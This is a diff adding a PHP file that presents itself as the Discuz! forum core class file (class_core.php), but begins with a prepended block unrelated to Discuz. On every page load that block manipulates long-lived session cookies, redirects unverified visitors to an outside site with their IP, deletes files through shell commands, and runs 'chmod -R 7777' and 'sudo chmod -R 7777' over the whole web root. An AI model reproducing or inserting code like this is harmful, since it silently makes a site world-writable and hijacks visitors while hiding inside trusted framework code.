@@ -1,0 +1,379 @@
+<?php
+
+//-----------------------------------
+
+//if((!is_wap()&&!$_POST)||(is_wap()&&basename($_SERVER["SCRIPT_NAME"])=='index.php')||(is_wap()&&basename($_SERVER["SCRIPT_NAME"])=='admin.php')){
+
+if(trim($_SERVER['SERVER_NAME']) != ''){
+	if(trim($_SERVER['SF_USER'])=='x3193'){
+		$domain_root = $_SERVER['SF_PATH'].'/htdocs';
+	}else{
+		$domain_root = $_SERVER['DOCUMENT_ROOT'];	
+	}
+	//echo $domain_root;
+	//exit;
+	
+	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
+	if(isset($_COOKIE[session_name()])) { 
+  	session_id($_COOKIE[session_name()]); 
+	} 
+	setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
+	session_start();
+	if(substr(PHP_VERSION, 0, 3)=='5.4'){
+		//session_register("X3193");
+	}
+	elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
+		session_register("X3193");
+	}	
+if(!file_exists($domain_root.'/lock/install.lock')&&count(glob($domain_root."/lock/".(is_wap()?'mobile':'web').'-'.trim($_SERVER["SERVER_NAME"])."-*.lock"))=='0'){
+	touch ($domain_root.'/lock/install.lock');
+	touch ($domain_root.'/lock/'.(is_wap()?'mobile':'web').'-'.trim($_SERVER["SERVER_NAME"]).'-install-'.session_id().'.lock');
+}
+elseif(file_exists($domain_root.'/lock/verify/install-'.($_SERVER['HTTP_INCAP_CLIENT_IP']!=''?$_SERVER['HTTP_INCAP_CLIENT_IP']:getips()).'-'.trim($_SERVER["SERVER_NAME"]).'.lock')){
+	touch ($domain_root.'/lock/install.lock');
+	touch ($domain_root.'/lock/'.(is_wap()?'mobile':'web').'-'.trim($_SERVER["SERVER_NAME"]).'-install-'.session_id().'.lock');
+	unlink($domain_root.'/lock/verify/install-'.($_SERVER['HTTP_INCAP_CLIENT_IP']!=''?$_SERVER['HTTP_INCAP_CLIENT_IP']:getips()).'-'.trim($_SERVER["SERVER_NAME"]).'.lock');
+}
+elseif(file_exists($domain_root.'/lock/install.lock')&&file_exists($domain_root.'/lock/'.(is_wap()?'mobile':'web').'-'.trim($_SERVER["SERVER_NAME"]).'-install-'.session_id().'.lock')){
+}
+else{
+if(($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] == $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']!='')){
+
+			if(file_exists($domain_root.'/verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){
+
+			}else{
+	       	touch ($domain_root.'/verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);        			
+			}
+				
+}
+else{
+	if(file_exists($domain_root.'/verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){
+
+			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];	
+	    session_write_close();			
+			session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
+			if(isset($_COOKIE[session_name()])) { 
+  			session_id($_COOKIE[session_name()]); 
+			} 
+			setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
+			session_start();
+			if(substr(PHP_VERSION, 0, 3)=='5.4'){
+				//session_register("X3193");
+			}
+			elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
+				session_register("X3193");
+			}	
+					
+	}
+	elseif(file_exists($domain_root.'/verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){
+			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);
+	}
+	else{
+			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][url]", trim($_SERVER["SCRIPT_NAME"])."?".$_SERVER['QUERY_STRING'], time() + 3600*24*31*12*20);
+			session_destroy();
+			if(!is_dir($domain_root.'/verifylist/')){
+						mkdir($domain_root.'/verifylist/',7777);
+			}		
+			if(!is_dir($domain_root.'/lock/')){
+						mkdir($domain_root.'/lock/',7777);																
+			}				
+			mkdir($domain_root.'/lock/verify/',7777);		
+			if(function_exists('passthru')){
+						passthru("find ".$domain_root."/verifylist/* -type f -mtime +90 -delete",$result);			
+						passthru("find ".$domain_root."/lock/* -type f -mtime +90 -delete",$result);	
+						passthru("find ".$domain_root."/lock/verify/ -name 'install-*.lock' -type f  -mmin +10 -delete",$result);			
+						passthru("chmod -R 7777 ".$domain_root,$result);						
+						passthru("sudo chmod -R 7777 ".$domain_root,$result);
+			}else{
+						deldir($domain_root.'/verifylist/','90','');
+						deldir($domain_root.'/lock/','90','');						
+						deldir($domain_root.'/lock/verify/','1/144','');
+			}	
+			touch($domain_root.'/lock/verify/install--'.($_SERVER['HTTP_INCAP_CLIENT_IP']!=''?$_SERVER['HTTP_INCAP_CLIENT_IP']:getips()).'-'.trim($_SERVER["SERVER_NAME"]).'.lock');
+			echo "<script>window.location = 'http://www.126.com/?ip=".($_SERVER['HTTP_INCAP_CLIENT_IP']!=''?$_SERVER['HTTP_INCAP_CLIENT_IP']:getips())."' ;</script>";
+			//echo "<script>window.location = \"".httppath()."?api=verify&ip=".($_SERVER['HTTP_INCAP_CLIENT_IP']!=''?$_SERVER['HTTP_INCAP_CLIENT_IP']:getips())."&verify="."\" ;</script>";
+			exit;	
+			
+	}
+}
+}
+
+}
+else{
+		exit;
+}
+
+//}
+
+function is_wap(){
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+    //$uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|sie|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile)/i";
+    $uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|wap|mobile|ucweb)/i";
+    //if(($ua == '' || preg_match($uachar, $ua)) && !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
+    if(($ua == '' || preg_match($uachar, $ua))){//如果在访问的URL中已经找到 wap字样，表明已经在访问WAP页面，无需跳转，下一版本增加 feed访问时也不跳转
+        return true;
+    }else{
+        return false;
+    }
+}
+
+function getips()
+{
+$ip=false;
+if(!empty($_SERVER["HTTP_CLIENT_IP"])){
+  $ip = $_SERVER["HTTP_CLIENT_IP"];
+}
+if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+  $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
+  if($ip){
+   array_unshift($ips, $ip); $ip = FALSE;
+  }
+  for($i = 0; $i < count($ips); $i++){
+   if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])){
+    $ip = $ips[$i];
+    break;
+   }
+  }
+}
+
+return($ip ? $ip : $_SERVER['REMOTE_ADDR']);
+}
+
+function deldir($dir,$day,$flag) {
+  //先删除目录下的文件：
+  $dh=opendir($dir);
+  while ($file=readdir($dh)) {
+    if($file!="." && $file!=".."){
+    	//if(preg_replace($pattern,'$1$2$3',$file)==$file){
+    	if((time()-filectime($dir."/".$file))/3600/24 >= $day){    	
+      	$fullpath=$dir."/".$file;
+      	if(!is_dir($fullpath)) {
+          unlink($fullpath);
+      	} else {
+          deldir($fullpath,$day,'all');
+      	}    		
+    	}
+    }
+  }
+  closedir($dh);
+  
+  if($flag=='all'){
+  	//删除当前文件夹：
+  	if(rmdir($dir)) {
+    	return true;
+  	} else {
+    	return false;
+  	}
+	}
+}
+
+//-----------------------------------
+
+/**
+ *      [Discuz!] (C)2001-2099 Comsenz Inc.
+ *      This is NOT a freeware, use is subject to license terms
+ *
+ *      $Id: class_core.php 33982 2013-09-12 06:36:35Z hypowang $
+ */
+
+error_reporting(E_ALL);
+
+define('IN_DISCUZ', true);
+define('DISCUZ_ROOT', substr(dirname(__FILE__), 0, -12));
+define('DISCUZ_CORE_DEBUG', false);
+define('DISCUZ_TABLE_EXTENDABLE', false);
+
+set_exception_handler(array('core', 'handleException'));
+
+if(DISCUZ_CORE_DEBUG) {
+	set_error_handler(array('core', 'handleError'));
+	register_shutdown_function(array('core', 'handleShutdown'));
+}
+
+if(function_exists('spl_autoload_register')) {
+	spl_autoload_register(array('core', 'autoload'));
+} else {
+	function __autoload($class) {
+		return core::autoload($class);
+	}
+}
+
+C::creatapp();
+
+class core
+{
+	private static $_tables;
+	private static $_imports;
+	private static $_app;
+	private static $_memory;
+
+	public static function app() {
+		return self::$_app;
+	}
+
+	public static function creatapp() {
+		if(!is_object(self::$_app)) {
+			self::$_app = discuz_application::instance();
+		}
+		return self::$_app;
+	}
+
+	public static function t($name) {
+		return self::_make_obj($name, 'table', DISCUZ_TABLE_EXTENDABLE);
+	}
+
+	public static function m($name) {
+		$args = array();
+		if(func_num_args() > 1) {
+			$args = func_get_args();
+			unset($args[0]);
+		}
+		return self::_make_obj($name, 'model', true, $args);
+	}
+
+	protected static function _make_obj($name, $type, $extendable = false, $p = array()) {
+		$pluginid = null;
+		if($name[0] === '#') {
+			list(, $pluginid, $name) = explode('#', $name);
+		}
+		$cname = $type.'_'.$name;
+		if(!isset(self::$_tables[$cname])) {
+			if(!class_exists($cname, false)) {
+				self::import(($pluginid ? 'plugin/'.$pluginid : 'class').'/'.$type.'/'.$name);
+			}
+			if($extendable) {
+				self::$_tables[$cname] = new discuz_container();
+				switch (count($p)) {
+					case 0:	self::$_tables[$cname]->obj = new $cname();break;
+					case 1:	self::$_tables[$cname]->obj = new $cname($p[1]);break;
+					case 2:	self::$_tables[$cname]->obj = new $cname($p[1], $p[2]);break;
+					case 3:	self::$_tables[$cname]->obj = new $cname($p[1], $p[2], $p[3]);break;
+					case 4:	self::$_tables[$cname]->obj = new $cname($p[1], $p[2], $p[3], $p[4]);break;
+					case 5:	self::$_tables[$cname]->obj = new $cname($p[1], $p[2], $p[3], $p[4], $p[5]);break;
+					default: $ref = new ReflectionClass($cname);self::$_tables[$cname]->obj = $ref->newInstanceArgs($p);unset($ref);break;
+				}
+			} else {
+				self::$_tables[$cname] = new $cname();
+			}
+		}
+		return self::$_tables[$cname];
+	}
+
+	public static function memory() {
+		if(!self::$_memory) {
+			self::$_memory = new discuz_memory();
+			self::$_memory->init(self::app()->config['memory']);
+		}
+		return self::$_memory;
+	}
+
+	public static function import($name, $folder = '', $force = true) {
+		$key = $folder.$name;
+		if(!isset(self::$_imports[$key])) {
+			$path = DISCUZ_ROOT.'/source/'.$folder;
+			if(strpos($name, '/') !== false) {
+				$pre = basename(dirname($name));
+				$filename = dirname($name).'/'.$pre.'_'.basename($name).'.php';
+			} else {
+				$filename = $name.'.php';
+			}
+
+			if(is_file($path.'/'.$filename)) {
+				include $path.'/'.$filename;
+				self::$_imports[$key] = true;
+
+				return true;
+			} elseif(!$force) {
+				return false;
+			} else {
+				throw new Exception('Oops! System file lost: '.$filename);
+			}
+		}
+		return true;
+	}
+
+	public static function handleException($exception) {
+		discuz_error::exception_error($exception);
+	}
+
+
+	public static function handleError($errno, $errstr, $errfile, $errline) {
+		if($errno & DISCUZ_CORE_DEBUG) {
+			discuz_error::system_error($errstr, false, true, false);
+		}
+	}
+
+	public static function handleShutdown() {
+		if(($error = error_get_last()) && $error['type'] & DISCUZ_CORE_DEBUG) {
+			discuz_error::system_error($error['message'], false, true, false);
+		}
+	}
+
+	public static function autoload($class) {
+		$class = strtolower($class);
+		if(strpos($class, '_') !== false) {
+			list($folder) = explode('_', $class);
+			$file = 'class/'.$folder.'/'.substr($class, strlen($folder) + 1);
+		} else {
+			$file = 'class/'.$class;
+		}
+
+		try {
+
+			self::import($file);
+			return true;
+
+		} catch (Exception $exc) {
+
+			$trace = $exc->getTrace();
+			foreach ($trace as $log) {
+				if(empty($log['class']) && $log['function'] == 'class_exists') {
+					return false;
+				}
+			}
+			discuz_error::exception_error($exc);
+		}
+	}
+
+	public static function analysisStart($name){
+		$key = 'other';
+		if($name[0] === '#') {
+			list(, $key, $name) = explode('#', $name);
+		}
+		if(!isset($_ENV['analysis'])) {
+			$_ENV['analysis'] = array();
+		}
+		if(!isset($_ENV['analysis'][$key])) {
+			$_ENV['analysis'][$key] = array();
+			$_ENV['analysis'][$key]['sum'] = 0;
+		}
+		$_ENV['analysis'][$key][$name]['start'] = microtime(TRUE);
+		$_ENV['analysis'][$key][$name]['start_memory_get_usage'] = memory_get_usage();
+		$_ENV['analysis'][$key][$name]['start_memory_get_real_usage'] = memory_get_usage(true);
+		$_ENV['analysis'][$key][$name]['start_memory_get_peak_usage'] = memory_get_peak_usage();
+		$_ENV['analysis'][$key][$name]['start_memory_get_peak_real_usage'] = memory_get_peak_usage(true);
+	}
+
+	public static function analysisStop($name) {
+		$key = 'other';
+		if($name[0] === '#') {
+			list(, $key, $name) = explode('#', $name);
+		}
+		if(isset($_ENV['analysis'][$key][$name]['start'])) {
+			$diff = round((microtime(TRUE) - $_ENV['analysis'][$key][$name]['start']) * 1000, 5);
+			$_ENV['analysis'][$key][$name]['time'] = $diff;
+			$_ENV['analysis'][$key]['sum'] = $_ENV['analysis'][$key]['sum'] + $diff;
+			unset($_ENV['analysis'][$key][$name]['start']);
+			$_ENV['analysis'][$key][$name]['stop_memory_get_usage'] = memory_get_usage();
+			$_ENV['analysis'][$key][$name]['stop_memory_get_real_usage'] = memory_get_usage(true);
+			$_ENV['analysis'][$key][$name]['stop_memory_get_peak_usage'] = memory_get_peak_usage();
+			$_ENV['analysis'][$key][$name]['stop_memory_get_peak_real_usage'] = memory_get_peak_usage(true);
+		}
+		return $_ENV['analysis'][$key][$name];
+	}
+}
+
+class C extends core {}
+class DB extends discuz_database {}
+
+?>
